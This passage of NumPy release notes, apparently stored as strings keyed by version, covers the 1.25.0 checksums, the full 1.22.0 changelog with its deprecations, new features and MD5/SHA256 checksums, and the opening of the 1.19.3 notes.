numpy-1.25.0-cp310-cp310-manylinux_2_17_x86_64.manylinux2014_x86_64.whl\n    bfccabfbd866c59545ce11ecdac60701  numpy-1.25.0-cp310-cp310-musllinux_1_1_x86_64.whl\n    22402904f194376b8d2de01481f04b03  numpy-1.25.0-cp310-cp310-win32.whl\n    e983b193f7d63568eac85d8bda8be62e  numpy-1.25.0-cp310-cp310-win_amd64.whl\n    5f6477db172f59a4fd7f591e1007e632  numpy-1.25.0-cp311-cp311-macosx_10_9_x86_64.whl\n    6a85cca47af69e3d45b4efab9490af4d  numpy-1.25.0-cp311-cp311-macosx_11_0_arm64.whl\n    ad1c0b4b406c9a2f1b42792502bc456b  numpy-1.25.0-cp311-cp311-manylinux_2_17_aarch64.manylinux2014_aarch64.whl\n    39e241f265611a9c1e89499054ead1c9  numpy-1.25.0-cp311-cp311-manylinux_2_17_x86_64.manylinux2014_x86_64.whl\n    e36b37acf1acfbc185face67c67bfe09  numpy-1.25.0-cp311-cp311-musllinux_1_1_x86_64.whl\n    67862d7849b4f0f943760142f1628aed  numpy-1.25.0-cp311-cp311-win32.whl\n    6e8ed7865792246cac2213bad404f4da  numpy-1.25.0-cp311-cp311-win_amd64.whl\n    25e843425697364f50dd7288ff9d2ce1  numpy-1.25.0-cp39-cp39-macosx_10_9_x86_64.whl\n    58641e53bcb1e13dfed1f5af1aff94bc  numpy-1.25.0-cp39-cp39-macosx_11_0_arm64.whl\n    ce15327793c39beecee8401356bc6c9b  numpy-1.25.0-cp39-cp39-manylinux_2_17_aarch64.manylinux2014_aarch64.whl\n    34b734a2c7698d59954c29fe7c0536f3  numpy-1.25.0-cp39-cp39-manylinux_2_17_x86_64.manylinux2014_x86_64.whl\n    6652d9df23c84e54466b10f4a2a290be  numpy-1.25.0-cp39-cp39-musllinux_1_1_x86_64.whl\n    c228105e3c4c8887823d99e35eea9d2b  numpy-1.25.0-cp39-cp39-win32.whl\n    1322210ae6a874293d13c4bb3abf24ee  numpy-1.25.0-cp39-cp39-win_amd64.whl\n    dc36096628e65077c2a44c493606c668  numpy-1.25.0-pp39-pypy39_pp73-macosx_10_9_x86_64.whl\n    942b4276f8d563efb111921d5995834c  numpy-1.25.0-pp39-pypy39_pp73-manylinux_2_17_x86_64.manylinux2014_x86_64.whl\n    0fa0734a8ff952dd643e7b9826168099  numpy-1.25.0-pp39-pypy39_pp73-win_amd64.whl\n    b236497153bc19b4a560ac485e4c2754  numpy-1.25.0.tar.gz\n\nSHA256\n------\n::\n\n    8aa130c3042052d656751df5e81f6d61edff3e289b5994edcf77f54118a8d9f4  numpy-1.25.0-cp310-cp310-macosx_10_9_x86_64.whl\n    9e3f2b96e3b63c978bc29daaa3700c028fe3f049ea3031b58aa33fe2a5809d24  numpy-1.25.0-cp310-cp310-macosx_11_0_arm64.whl\n    d6b267f349a99d3908b56645eebf340cb58f01bd1e773b4eea1a905b3f0e4208  numpy-1.25.0-cp310-cp310-manylinux_2_17_aarch64.manylinux2014_aarch64.whl\n    4aedd08f15d3045a4e9c648f1e04daca2ab1044256959f1f95aafeeb3d794c16  numpy-1.25.0-cp310-cp310-manylinux_2_17_x86_64.manylinux2014_x86_64.whl\n    6d183b5c58513f74225c376643234c369468e02947b47942eacbb23c1671f25d  numpy-1.25.0-cp310-cp310-musllinux_1_1_x86_64.whl\n    d76a84998c51b8b68b40448ddd02bd1081bb33abcdc28beee6cd284fe11036c6  numpy-1.25.0-cp310-cp310-win32.whl\n    c0dc071017bc00abb7d7201bac06fa80333c6314477b3d10b52b58fa6a6e38f6  numpy-1.25.0-cp310-cp310-win_amd64.whl\n    4c69fe5f05eea336b7a740e114dec995e2f927003c30702d896892403df6dbf0  numpy-1.25.0-cp311-cp311-macosx_10_9_x86_64.whl\n    9c7211d7920b97aeca7b3773a6783492b5b93baba39e7c36054f6e749fc7490c  numpy-1.25.0-cp311-cp311-macosx_11_0_arm64.whl\n    ecc68f11404930e9c7ecfc937aa423e1e50158317bf67ca91736a9864eae0232  numpy-1.25.0-cp311-cp311-manylinux_2_17_aarch64.manylinux2014_aarch64.whl\n    e559c6afbca484072a98a51b6fa466aae785cfe89b69e8b856c3191bc8872a82  numpy-1.25.0-cp311-cp311-manylinux_2_17_x86_64.manylinux2014_x86_64.whl\n    6c284907e37f5e04d2412950960894b143a648dea3f79290757eb878b91acbd1  numpy-1.25.0-cp311-cp311-musllinux_1_1_x86_64.whl\n    95367ccd88c07af21b379be1725b5322362bb83679d36691f124a16357390153  numpy-1.25.0-cp311-cp311-win32.whl\n    b76aa836a952059d70a2788a2d98cb2a533ccd46222558b6970348939e55fc24  numpy-1.25.0-cp311-cp311-win_amd64.whl\n    b792164e539d99d93e4e5e09ae10f8cbe5466de7d759fc155e075237e0c274e4  numpy-1.25.0-cp39-cp39-macosx_10_9_x86_64.whl\n    7cd981ccc0afe49b9883f14761bb57c964df71124dcd155b0cba2b591f0d64b9  numpy-1.25.0-cp39-cp39-macosx_11_0_arm64.whl\n    5aa48bebfb41f93043a796128854b84407d4df730d3fb6e5dc36402f5cd594c0  numpy-1.25.0-cp39-cp39-manylinux_2_17_aarch64.manylinux2014_aarch64.whl\n    5177310ac2e63d6603f659fadc1e7bab33dd5a8db4e0596df34214eeab0fee3b  numpy-1.25.0-cp39-cp39-manylinux_2_17_x86_64.manylinux2014_x86_64.whl\n    0ac6edfb35d2a99aaf102b509c8e9319c499ebd4978df4971b94419a116d0790  numpy-1.25.0-cp39-cp39-musllinux_1_1_x86_64.whl\n    7412125b4f18aeddca2ecd7219ea2d2708f697943e6f624be41aa5f8a9852cc4  numpy-1.25.0-cp39-cp39-win32.whl\n    26815c6c8498dc49d81faa76d61078c4f9f0859ce7817919021b9eba72b425e3  numpy-1.25.0-cp39-cp39-win_amd64.whl\n    5b1b90860bf7d8a8c313b372d4f27343a54f415b20fb69dd601b7efe1029c91e  numpy-1.25.0-pp39-pypy39_pp73-macosx_10_9_x86_64.whl\n    85cdae87d8c136fd4da4dad1e48064d700f63e923d5af6c8c782ac0df8044542  numpy-1.25.0-pp39-pypy39_pp73-manylinux_2_17_x86_64.manylinux2014_x86_64.whl\n    cc3fda2b36482891db1060f00f881c77f9423eead4c3579629940a3e12095fe8  numpy-1.25.0-pp39-pypy39_pp73-win_amd64.whl\n    f1accae9a28dc3cda46a91de86acf69de0d1b5f4edd44a9b0c3ceb8036dfff19  numpy-1.25.0.tar.gz\n\n\n.. currentmodule:: numpy\n\n==========================\n", "1.22.0": "==========================\nNumPy 1.22.0 is a big release featuring the work of 153 contributers spread\nover 609 pull requests. There have been many improvements, highlights are:\n\n* Annotations of the main namespace are essentially complete. Upstream is a\n  moving target, so there will likely be further improvements, but the major\n  work is done. This is probably the most user visible enhancement in this\n  release.\n* A preliminary version of the proposed Array-API is provided. This is a step\n  in creating a standard collection of functions that can be used across\n  applications such as CuPy and JAX.\n* NumPy now has a DLPack backend. DLPack provides a common interchange format\n  for array (tensor) data.\n* New methods for ``quantile``, ``percentile``, and related functions. The new\n  methods provide a complete set of the methods commonly found in the\n  literature.\n* A new configurable allocator for use by downstream projects.\n* The universal functions have been refactored to implement most of\n  :ref:`NEP 43 <NEP43>`.  This also unlocks the ability to experiment with the\n  future DType API.\n\nThese are in addition to the ongoing work to provide SIMD support for commonly\nused functions, improvements to F2PY, and better documentation.\n\nThe Python versions supported in this release are 3.8-3.10, Python 3.7 has been\ndropped. Note that 32 bit wheels are only provided for Python 3.8 and 3.9 on\nWindows, all other wheels are 64 bits on account of Ubuntu, Fedora, and other\nLinux distributions dropping 32 bit support. All 64 bit wheels are also linked\nwith 64 bit integer OpenBLAS, which should fix the occasional problems\nencountered by folks using truly huge arrays.\n\n\nExpired deprecations\n====================\n\nDeprecated numeric style dtype strings have been removed\n--------------------------------------------------------\nUsing the strings ``\"Bytes0\"``, ``\"Datetime64\"``, ``\"Str0\"``, ``\"Uint32\"``,\nand ``\"Uint64\"`` as a dtype will now raise a ``TypeError``.\n\n(`gh-19539 <https://github.com/numpy/numpy/pull/19539>`__)\n\nExpired deprecations for ``loads``, ``ndfromtxt``, and ``mafromtxt`` in npyio\n-----------------------------------------------------------------------------\n``numpy.loads`` was deprecated in v1.15, with the recommendation that users use\n``pickle.loads`` instead.  ``ndfromtxt`` and ``mafromtxt`` were both deprecated\nin v1.17 - users should use ``numpy.genfromtxt`` instead with the appropriate\nvalue for the ``usemask`` parameter.\n\n(`gh-19615 <https://github.com/numpy/numpy/pull/19615>`__)\n\n\nDeprecations\n============\n\nUse delimiter rather than delimitor as kwarg in mrecords\n--------------------------------------------------------\nThe misspelled keyword argument ``delimitor`` of\n``numpy.ma.mrecords.fromtextfile()`` has been changed to ``delimiter``, using\nit will emit a deprecation warning.\n\n(`gh-19921 <https://github.com/numpy/numpy/pull/19921>`__)\n\nPassing boolean ``kth`` values to (arg-)partition has been deprecated\n---------------------------------------------------------------------\n``numpy.partition`` and ``numpy.argpartition`` would previously accept boolean\nvalues for the ``kth`` parameter, which would subsequently be converted into\nintegers. This behavior has now been deprecated.\n\n(`gh-20000 <https://github.com/numpy/numpy/pull/20000>`__)\n\nThe ``np.MachAr`` class has been deprecated\n-------------------------------------------\nThe ``numpy.MachAr`` class and ``finfo.machar <numpy.finfo>`` attribute have\nbeen deprecated. Users are encouraged to access the property if interest\ndirectly from the corresponding ``numpy.finfo`` attribute.\n\n(`gh-20201 <https://github.com/numpy/numpy/pull/20201>`__)\n\n\nCompatibility notes\n===================\n\nDistutils forces strict floating point model on clang\n-----------------------------------------------------\nNumPy now sets the ``-ftrapping-math`` option on clang to enforce correct\nfloating point error handling for universal functions.  Clang defaults to\nnon-IEEE and C99 conform behaviour otherwise.  This change (using the\nequivalent but newer ``-ffp-exception-behavior=strict``) was attempted in NumPy\n1.21, but was effectively never used.\n\n(`gh-19479 <https://github.com/numpy/numpy/pull/19479>`__)\n\nRemoved floor division support for complex types\n------------------------------------------------\nFloor division of complex types will now result in a ``TypeError``\n\n.. code-block:: python\n\n    >>> a = np.arange(10) + 1j* np.arange(10)\n    >>> a // 1\n    TypeError: ufunc 'floor_divide' not supported for the input types...\n\n(`gh-19135 <https://github.com/numpy/numpy/pull/19135>`__)\n\n``numpy.vectorize`` functions now produce the same output class as the base function\n------------------------------------------------------------------------------------\nWhen a function that respects ``numpy.ndarray`` subclasses is vectorized using\n``numpy.vectorize``, the vectorized function will now be subclass-safe also for\ncases that a signature is given (i.e., when creating a ``gufunc``): the output\nclass will be the same as that returned by the first call to the underlying\nfunction.\n\n(`gh-19356 <https://github.com/numpy/numpy/pull/19356>`__)\n\nPython 3.7 is no longer supported\n---------------------------------\nPython support has been dropped. This is rather strict, there are changes that\nrequire Python >= 3.8.\n\n(`gh-19665 <https://github.com/numpy/numpy/pull/19665>`__)\n\nstr/repr of complex dtypes now include space after punctuation\n--------------------------------------------------------------\nThe repr of ``np.dtype({\"names\": [\"a\"], \"formats\": [int], \"offsets\": [2]})`` is\nnow ``dtype({'names': ['a'], 'formats': ['<i8'], 'offsets': [2], 'itemsize':\n10})``, whereas spaces where previously omitted after colons and between\nfields.\n\nThe old behavior can be restored via ``np.set_printoptions(legacy=\"1.21\")``.\n\n(`gh-19687 <https://github.com/numpy/numpy/pull/19687>`__)\n\nCorrected ``advance`` in ``PCG64DSXM`` and ``PCG64``\n----------------------------------------------------\nFixed a bug in the ``advance`` method of ``PCG64DSXM`` and ``PCG64``. The bug\nonly affects results when the step was larger than :math:`2^{64}` on platforms\nthat do not support 128-bit integers(e.g., Windows and 32-bit Linux).\n\n(`gh-20049 <https://github.com/numpy/numpy/pull/20049>`__)\n\nChange in generation of random 32 bit floating point variates\n-------------------------------------------------------------\nThere was bug in the generation of 32 bit floating point values from the\nuniform distribution that would result in the least significant bit of the\nrandom variate always being 0.  This has been fixed.\n\nThis change affects the variates produced by the ``random.Generator`` methods\n``random``, ``standard_normal``, ``standard_exponential``, and\n``standard_gamma``, but only when the dtype is specified as ``numpy.float32``.\n\n(`gh-20314 <https://github.com/numpy/numpy/pull/20314>`__)\n\n\nC API changes\n=============\n\nMasked inner-loops cannot be customized anymore\n-----------------------------------------------\nThe masked inner-loop selector is now never used.  A warning will be given in\nthe unlikely event that it was customized.\n\nWe do not expect that any code uses this.  If you do use it, you must unset the\nselector on newer NumPy version.  Please also contact the NumPy developers, we\ndo anticipate providing a new, more specific, mechanism.\n\nThe customization was part of a never-implemented feature to allow for faster\nmasked operations.\n\n(`gh-19259 <https://github.com/numpy/numpy/pull/19259>`__)\n\nExperimental exposure of future DType and UFunc API\n---------------------------------------------------\nThe new header ``experimental_public_dtype_api.h`` allows to experiment with\nfuture API for improved universal function and especially user DType support.\nAt this time it is advisable to experiment using the development version\nof NumPy since some changes are expected and new features will be unlocked.\n\n(`gh-19919 <https://github.com/numpy/numpy/pull/19919>`__)\n\n\nNew Features\n============\n\nNEP 49 configurable allocators\n------------------------------\nAs detailed in `NEP 49`_, the function used for allocation of the data segment\nof a ndarray can be changed. The policy can be set globally or in a context.\nFor more information see the NEP and the :ref:`data_memory` reference docs.\nAlso add a ``NUMPY_WARN_IF_NO_MEM_POLICY`` override to warn on dangerous use\nof transfering ownership by setting ``NPY_ARRAY_OWNDATA``.\n\n.. _`NEP 49`: https://numpy.org/neps/nep-0049.html\n\n(`gh-17582 <https://github.com/numpy/numpy/pull/17582>`__)\n\nImplementation of the NEP 47 (adopting the array API standard)\n--------------------------------------------------------------\nAn initial implementation of `NEP 47`_ (adoption the array API standard) has\nbeen added as ``numpy.array_api``. The implementation is experimental and will\nissue a UserWarning on import, as the `array API standard\n<https://data-apis.org/array-api/latest/index.html>`_ is still in draft state.\n``numpy.array_api`` is a conforming implementation of the array API standard,\nwhich is also minimal, meaning that only those functions and behaviors that are\nrequired by the standard are implemented (see the NEP for more info).\nLibraries wishing to make use of the array API standard are encouraged to use\n``numpy.array_api`` to check that they are only using functionality that is\nguaranteed to be present in standard conforming implementations.\n\n.. _`NEP 47`: https://numpy.org/neps/nep-0047-array-api-standard.html\n\n(`gh-18585 <https://github.com/numpy/numpy/pull/18585>`__)\n\nGenerate C/C++ API reference documentation from comments blocks is now possible\n-------------------------------------------------------------------------------\nThis feature depends on Doxygen_ in the generation process and on Breathe_ to\nintegrate it with Sphinx.\n\n.. _`Doxygen`: https://www.doxygen.nl/index.html\n.. _`Breathe`: https://breathe.readthedocs.io/en/latest/\n\n(`gh-18884 <https://github.com/numpy/numpy/pull/18884>`__)\n\nAssign the platform-specific ``c_intp`` precision via a mypy plugin\n-------------------------------------------------------------------\nThe mypy_ plugin, introduced in `numpy/numpy17843`_, has again been expanded:\nthe plugin now is now responsible for setting the platform-specific precision\nof ``numpy.ctypeslib.c_intp``, the latter being used as data type for various\n``numpy.ndarray.ctypes`` attributes.\n\nWithout the plugin, aforementioned type will default to ``ctypes.c_int64``.\n\nTo enable the plugin, one must add it to their mypy `configuration file`_:\n\n.. code-block:: ini\n\n    [mypy]\n    plugins = numpy.typing.mypy_plugin\n\n\n.. _mypy: http://mypy-lang.org/\n.. _configuration file: https://mypy.readthedocs.io/en/stable/config_file.html\n.. _`numpy/numpy17843`: https://github.com/numpy/numpy/pull/17843\n\n(`gh-19062 <https://github.com/numpy/numpy/pull/19062>`__)\n\nAdd NEP 47-compatible dlpack support\n------------------------------------\nAdd a ``ndarray.__dlpack__()`` method which returns a ``dlpack`` C structure\nwrapped in a ``PyCapsule``. Also add a ``np._from_dlpack(obj)`` function, where\n``obj`` supports ``__dlpack__()``, and returns an ``ndarray``.\n\n(`gh-19083 <https://github.com/numpy/numpy/pull/19083>`__)\n\n``keepdims`` optional argument added to ``numpy.argmin``, ``numpy.argmax``\n--------------------------------------------------------------------------\n``keepdims`` argument is added to ``numpy.argmin``, ``numpy.argmax``.  If set\nto ``True``, the axes which are reduced are left in the result as dimensions\nwith size one.  The resulting array has the same number of dimensions and will\nbroadcast with the input array.\n\n(`gh-19211 <https://github.com/numpy/numpy/pull/19211>`__)\n\n``bit_count`` to compute the number of 1-bits in an integer\n-----------------------------------------------------------\nComputes the number of 1-bits in the absolute value of the input.\nThis works on all the numpy integer types. Analogous to the builtin\n``int.bit_count`` or ``popcount`` in C++.\n\n.. code-block:: python\n\n    >>> np.uint32(1023).bit_count()\n    10\n    >>> np.int32(-127).bit_count()\n    7\n\n(`gh-19355 <https://github.com/numpy/numpy/pull/19355>`__)\n\nThe ``ndim`` and ``axis`` attributes have been added to ``numpy.AxisError``\n---------------------------------------------------------------------------\nThe ``ndim`` and ``axis`` parameters are now also stored as attributes\nwithin each ``numpy.AxisError`` instance.\n\n(`gh-19459 <https://github.com/numpy/numpy/pull/19459>`__)\n\nPreliminary support for ``windows/arm64`` target\n------------------------------------------------\n``numpy`` added support for windows/arm64 target. Please note ``OpenBLAS``\nsupport is not yet available for windows/arm64 target.\n\n(`gh-19513 <https://github.com/numpy/numpy/pull/19513>`__)\n\nAdded support for LoongArch\n---------------------------\nLoongArch is a new instruction set, numpy compilation failure on LoongArch\narchitecture, so add the commit.\n\n(`gh-19527 <https://github.com/numpy/numpy/pull/19527>`__)\n\nA ``.clang-format`` file has been added\n---------------------------------------\nClang-format is a C/C++ code formatter, together with the added\n``.clang-format`` file, it produces code close enough to the NumPy\nC_STYLE_GUIDE for general use. Clang-format version 12+ is required due to the\nuse of several new features, it is available in Fedora 34 and Ubuntu Focal\namong other distributions.\n\n(`gh-19754 <https://github.com/numpy/numpy/pull/19754>`__)\n\n``is_integer`` is now available to ``numpy.floating`` and ``numpy.integer``\n---------------------------------------------------------------------------\nBased on its counterpart in Python ``float`` and ``int``, the numpy floating\npoint and integer types now support ``float.is_integer``. Returns ``True`` if\nthe number is finite with integral value, and ``False`` otherwise.\n\n.. code-block:: python\n\n    >>> np.float32(-2.0).is_integer()\n    True\n    >>> np.float64(3.2).is_integer()\n    False\n    >>> np.int32(-2).is_integer()\n    True\n\n(`gh-19803 <https://github.com/numpy/numpy/pull/19803>`__)\n\nSymbolic parser for Fortran dimension specifications\n----------------------------------------------------\nA new symbolic parser has been added to f2py in order to correctly parse\ndimension specifications. The parser is the basis for future improvements and\nprovides compatibility with Draft Fortran 202x.\n\n(`gh-19805 <https://github.com/numpy/numpy/pull/19805>`__)\n\n``ndarray``, ``dtype`` and ``number`` are now runtime-subscriptable\n-------------------------------------------------------------------\nMimicking :pep:`585`, the ``numpy.ndarray``, ``numpy.dtype`` and\n``numpy.number`` classes are now subscriptable for python 3.9 and later.\nConsequently, expressions that were previously only allowed in .pyi stub files\nor with the help of ``from __future__ import annotations`` are now also legal\nduring runtime.\n\n.. code-block:: python\n\n    >>> import numpy as np\n    >>> from typing import Any\n\n    >>> np.ndarray[Any, np.dtype[np.float64]]\n    numpy.ndarray[typing.Any, numpy.dtype[numpy.float64]]\n\n(`gh-19879 <https://github.com/numpy/numpy/pull/19879>`__)\n\n\nImprovements\n============\n\n``ctypeslib.load_library`` can now take any path-like object\n------------------------------------------------------------\nAll parameters in the can now take any :term:`python:path-like object`.\nThis includes the likes of strings, bytes and objects implementing the\n:meth:`__fspath__<os.PathLike.__fspath__>` protocol.\n\n(`gh-17530 <https://github.com/numpy/numpy/pull/17530>`__)\n\nAdd ``smallest_normal`` and ``smallest_subnormal`` attributes to ``finfo``\n--------------------------------------------------------------------------\nThe attributes ``smallest_normal`` and ``smallest_subnormal`` are available as\nan extension of ``finfo`` class for any floating-point data type. To use these\nnew attributes, write ``np.finfo(np.float64).smallest_normal`` or\n``np.finfo(np.float64).smallest_subnormal``.\n\n(`gh-18536 <https://github.com/numpy/numpy/pull/18536>`__)\n\n``numpy.linalg.qr`` accepts stacked matrices as inputs\n------------------------------------------------------\n``numpy.linalg.qr`` is able to produce results for stacked matrices as inputs.\nMoreover, the implementation of QR decomposition has been shifted to C from\nPython.\n\n(`gh-19151 <https://github.com/numpy/numpy/pull/19151>`__)\n\n``numpy.fromregex`` now accepts ``os.PathLike`` implementations\n---------------------------------------------------------------\n``numpy.fromregex`` now accepts objects implementing the ``__fspath__<os.PathLike>``\nprotocol, *e.g.* ``pathlib.Path``.\n\n(`gh-19680 <https://github.com/numpy/numpy/pull/19680>`__)\n\nAdd new methods for ``quantile`` and ``percentile``\n---------------------------------------------------\n``quantile`` and ``percentile`` now have have a ``method=`` keyword argument\nsupporting 13 different methods.  This replaces the ``interpolation=`` keyword\nargument.\n\nThe methods are now aligned with nine methods which can be found in scientific\nliterature and the R language.  The remaining methods are the previous\ndiscontinuous variations of the default \"linear\" one.\n\nPlease see the documentation of ``numpy.percentile`` for more information.\n\n(`gh-19857 <https://github.com/numpy/numpy/pull/19857>`__)\n\nMissing parameters have been added to the ``nan<x>`` functions\n--------------------------------------------------------------\nA number of the ``nan<x>`` functions previously lacked parameters that were\npresent in their ``<x>``-based counterpart, *e.g.* the ``where`` parameter was\npresent in ``numpy.mean`` but absent from ``numpy.nanmean``.\n\nThe following parameters have now been added to the ``nan<x>`` functions:\n\n* nanmin: ``initial`` & ``where``\n* nanmax: ``initial`` & ``where``\n* nanargmin: ``keepdims`` & ``out``\n* nanargmax: ``keepdims`` & ``out``\n* nansum: ``initial`` & ``where``\n* nanprod: ``initial`` & ``where``\n* nanmean: ``where``\n* nanvar: ``where``\n* nanstd: ``where``\n\n(`gh-20027 <https://github.com/numpy/numpy/pull/20027>`__)\n\nAnnotating the main Numpy namespace\n-----------------------------------\nStarting from the 1.20 release, PEP 484 type annotations have been included for\nparts of the NumPy library; annotating the remaining functions being a work in\nprogress. With the release of 1.22 this process has been completed for the main\nNumPy namespace, which is now fully annotated.\n\nBesides the main namespace, a limited number of sub-packages contain\nannotations as well. This includes, among others, ``numpy.testing``,\n``numpy.linalg`` and ``numpy.random`` (available since 1.21).\n\n(`gh-20217 <https://github.com/numpy/numpy/pull/20217>`__)\n\nVectorize umath module using AVX-512\n-------------------------------------\nBy leveraging Intel Short Vector Math Library (SVML), 18 umath functions\n(``exp2``, ``log2``, ``log10``, ``expm1``, ``log1p``, ``cbrt``, ``sin``,\n``cos``, ``tan``, ``arcsin``, ``arccos``, ``arctan``, ``sinh``, ``cosh``,\n``tanh``, ``arcsinh``, ``arccosh``, ``arctanh``) are vectorized using AVX-512\ninstruction set for both single and double precision implementations.  This\nchange is currently enabled only for Linux users and on processors with AVX-512\ninstruction set.  It provides an average speed up of 32x and 14x for single and\ndouble precision functions respectively.\n\n(`gh-19478 <https://github.com/numpy/numpy/pull/19478>`__)\n\nOpenBLAS v0.3.17\n----------------\nUpdate the OpenBLAS used in testing and in wheels to v0.3.17\n\n(`gh-19462 <https://github.com/numpy/numpy/pull/19462>`__)\n\n\nChecksums\n=========\n\nMD5\n---\n::\n\n    66757b963ad5835038b9a2a9df852c84  numpy-1.22.0-cp310-cp310-macosx_10_9_universal2.whl\n    86b7f3a94c09dbd6869614c4d7f9ba5e  numpy-1.22.0-cp310-cp310-macosx_10_9_x86_64.whl\n    5184db17d8e5e6ecdc53e2f0a6964c35  numpy-1.22.0-cp310-cp310-macosx_11_0_arm64.whl\n    6643e9a076cce736cfbe15face4db9db  numpy-1.22.0-cp310-cp310-manylinux_2_17_aarch64.manylinux2014_aarch64.whl\n    6efef45bf63594703c094b2ad729e648  numpy-1.22.0-cp310-cp310-manylinux_2_17_x86_64.manylinux2014_x86_64.whl\n    7a1a21bb0958a3eb920deeef9e745935  numpy-1.22.0-cp310-cp310-win_amd64.whl\n    45241fb5f31ea46e2b6f1321a63c8e1c  numpy-1.22.0-cp38-cp38-macosx_10_9_universal2.whl\n    472f24a5d35116634fcc57e9bda899bc  numpy-1.22.0-cp38-cp38-macosx_10_9_x86_64.whl\n    6c15cf7847b20101ae281ade6121b79e  numpy-1.22.0-cp38-cp38-macosx_11_0_arm64.whl\n    313f0fd99a899a7465511c1418e1031f  numpy-1.22.0-cp38-cp38-manylinux_2_17_aarch64.manylinux2014_aarch64.whl\n    9ae6ecde0cbeadd2a9d7b8ae54285863  numpy-1.22.0-cp38-cp38-manylinux_2_17_x86_64.manylinux2014_x86_64.whl\n    0f31a7b9e128b0cdafecf98cf1301fc0  numpy-1.22.0-cp38-cp38-win32.whl\n    f4b45579cf532ea632b890b1df387081  numpy-1.22.0-cp38-cp38-win_amd64.whl\n    2cb27112b11c16f700e6019f5fd36408  numpy-1.22.0-cp39-cp39-macosx_10_9_universal2.whl\n    4554a5797a4cb787b5169a8f5482fb95  numpy-1.22.0-cp39-cp39-macosx_10_9_x86_64.whl\n    3780decd94837da6f0816f2feaace9c2  numpy-1.22.0-cp39-cp39-macosx_11_0_arm64.whl\n    6e519dd5205510dfebcadc6f7fdf9738  numpy-1.22.0-cp39-cp39-manylinux_2_17_aarch64.manylinux2014_aarch64.whl\n    89d455bf290f459a70c57620f02d5b69  numpy-1.22.0-cp39-cp39-manylinux_2_17_x86_64.manylinux2014_x86_64.whl\n    6425f8d7dc779a54b8074e198cea43c9  numpy-1.22.0-cp39-cp39-win32.whl\n    1b5c670328146975b21b54fa5ef8ec4c  numpy-1.22.0-cp39-cp39-win_amd64.whl\n    05d842127ca85cca12fed3a26b0f5177  numpy-1.22.0-pp38-pypy38_pp73-manylinux_2_17_x86_64.manylinux2014_x86_64.whl\n    ab751b8d4195f91ae61a402184d16d18  numpy-1.22.0.tar.gz\n    252de134862a27bd66705d29622edbfe  numpy-1.22.0.zip\n\nSHA256\n------\n::\n\n    3d22662b4b10112c545c91a0741f2436f8ca979ab3d69d03d19322aa970f9695  numpy-1.22.0-cp310-cp310-macosx_10_9_universal2.whl\n    11a1f3816ea82eed4178102c56281782690ab5993251fdfd75039aad4d20385f  numpy-1.22.0-cp310-cp310-macosx_10_9_x86_64.whl\n    5dc65644f75a4c2970f21394ad8bea1a844104f0fe01f278631be1c7eae27226  numpy-1.22.0-cp310-cp310-macosx_11_0_arm64.whl\n    42c16cec1c8cf2728f1d539bd55aaa9d6bb48a7de2f41eb944697293ef65a559  numpy-1.22.0-cp310-cp310-manylinux_2_17_aarch64.manylinux2014_aarch64.whl\n    a97e82c39d9856fe7d4f9b86d8a1e66eff99cf3a8b7ba48202f659703d27c46f  numpy-1.22.0-cp310-cp310-manylinux_2_17_x86_64.manylinux2014_x86_64.whl\n    e41e8951749c4b5c9a2dc5fdbc1a4eec6ab2a140fdae9b460b0f557eed870f4d  numpy-1.22.0-cp310-cp310-win_amd64.whl\n    bece0a4a49e60e472a6d1f70ac6cdea00f9ab80ff01132f96bd970cdd8a9e5a9  numpy-1.22.0-cp38-cp38-macosx_10_9_universal2.whl\n    818b9be7900e8dc23e013a92779135623476f44a0de58b40c32a15368c01d471  numpy-1.22.0-cp38-cp38-macosx_10_9_x86_64.whl\n    47ee7a839f5885bc0c63a74aabb91f6f40d7d7b639253768c4199b37aede7982  numpy-1.22.0-cp38-cp38-macosx_11_0_arm64.whl\n    a024181d7aef0004d76fb3bce2a4c9f2e67a609a9e2a6ff2571d30e9976aa383  numpy-1.22.0-cp38-cp38-manylinux_2_17_aarch64.manylinux2014_aarch64.whl\n    f71d57cc8645f14816ae249407d309be250ad8de93ef61d9709b45a0ddf4050c  numpy-1.22.0-cp38-cp38-manylinux_2_17_x86_64.manylinux2014_x86_64.whl\n    283d9de87c0133ef98f93dfc09fad3fb382f2a15580de75c02b5bb36a5a159a5  numpy-1.22.0-cp38-cp38-win32.whl\n    2762331de395739c91f1abb88041f94a080cb1143aeec791b3b223976228af3f  numpy-1.22.0-cp38-cp38-win_amd64.whl\n    76ba7c40e80f9dc815c5e896330700fd6e20814e69da9c1267d65a4d051080f1  numpy-1.22.0-cp39-cp39-macosx_10_9_universal2.whl\n    0cfe07133fd00b27edee5e6385e333e9eeb010607e8a46e1cd673f05f8596595  numpy-1.22.0-cp39-cp39-macosx_10_9_x86_64.whl\n    6ed0d073a9c54ac40c41a9c2d53fcc3d4d4ed607670b9e7b0de1ba13b4cbfe6f  numpy-1.22.0-cp39-cp39-macosx_11_0_arm64.whl\n    41388e32e40b41dd56eb37fcaa7488b2b47b0adf77c66154d6b89622c110dfe9  numpy-1.22.0-cp39-cp39-manylinux_2_17_aarch64.manylinux2014_aarch64.whl\n    b55b953a1bdb465f4dc181758570d321db4ac23005f90ffd2b434cc6609a63dd  numpy-1.22.0-cp39-cp39-manylinux_2_17_x86_64.manylinux2014_x86_64.whl\n    5a311ee4d983c487a0ab546708edbdd759393a3dc9cd30305170149fedd23c88  numpy-1.22.0-cp39-cp39-win32.whl\n    a97a954a8c2f046d3817c2bce16e3c7e9a9c2afffaf0400f5c16df5172a67c9c  numpy-1.22.0-cp39-cp39-win_amd64.whl\n    bb02929b0d6bfab4c48a79bd805bd7419114606947ec8284476167415171f55b  numpy-1.22.0-pp38-pypy38_pp73-manylinux_2_17_x86_64.manylinux2014_x86_64.whl\n    f2be14ba396780a6f662b8ba1a24466c9cf18a6a386174f614668e58387a13d7  numpy-1.22.0.tar.gz\n    a955e4128ac36797aaffd49ab44ec74a71c11d6938df83b1285492d277db5397  numpy-1.22.0.zip\n\n\n.. currentmodule:: numpy\n\n==========================\n", "1.19.3": "==========================\n\nNumPy 1.19.3 is a small maintenace release with two major improvements:\n\n- Python 3.9 binary wheels on all supported platforms.\n- OpenBLAS fixes for Windows 10 version 2004 fmod bug.\n\nThis release supports Python 3.6-3.9 and is linked with OpenBLAS 3.7 to avoid\nsome of the fmod problems on Windows 10 version 2004. Microsoft is aware of the\nproblem and users should upgrade when the fix becomes available, the fix here\nis limited in scope.\n\nContributors\n============\n\nA total of 8 people contributed to this release.  People with a \"+\" by their\nnames contributed a patch for the first time.\n\n* Charles Harris\n* Chris Brown +\n* Daniel Vanzo +\n* E. Madison Bray +\n* Hugo van Kemenade +\n* Ralf Gommers\n* Sebastian Berg\n* danbeibei +\n\nPull requests merged\n====================\n\nA 